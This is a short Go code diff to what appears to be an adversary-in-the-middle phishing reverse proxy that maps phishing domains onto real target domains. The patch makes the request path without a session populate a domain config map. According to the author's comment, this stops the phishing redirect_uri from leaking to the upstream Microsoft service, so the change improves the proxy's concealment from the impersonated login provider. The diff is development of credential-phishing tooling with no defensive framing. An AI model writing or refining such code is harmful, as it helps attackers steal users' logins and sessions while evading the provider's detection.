@@ -520,14 +520,17 @@ func (m *ProxyHandler) prepareRequestWithoutSession(req *http.Request, reqCtx *R
 	dummySession := &service.ProxySession{
 		Config: sync.Map{},
 	}
-	// populate dummy config for normalization - need to map phishing domains to target domains
-	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Hosts != nil {
-		for targetDomain, hostConfig := range reqCtx.ProxyConfig.Hosts {
-			if hostConfig != nil {
-				dummySession.Config.Store(targetDomain, *hostConfig)
-			}
-		}
-	}
+	// ponytail: session path sets ConfigMap at ~line 630; no-session path
+    // was leaving it nil, so patchQueryParametersWithContext had nothing to
+    // reverse-map -> phish redirect_uri leaked to upstream MS.
+	if reqCtx.ConfigMap == nil && reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Hosts != nil {
+        reqCtx.ConfigMap = make(map[string]service.ProxyServiceDomainConfig, len(reqCtx.ProxyConfig.Hosts))
+        for k, v := range reqCtx.ProxyConfig.Hosts {
+            if v != nil {
+                reqCtx.ConfigMap[k] = *v
+            }
+        }
+    }
 
 	// normalize headers
 	m.normalizeRequestHeaders(req, dummySession)
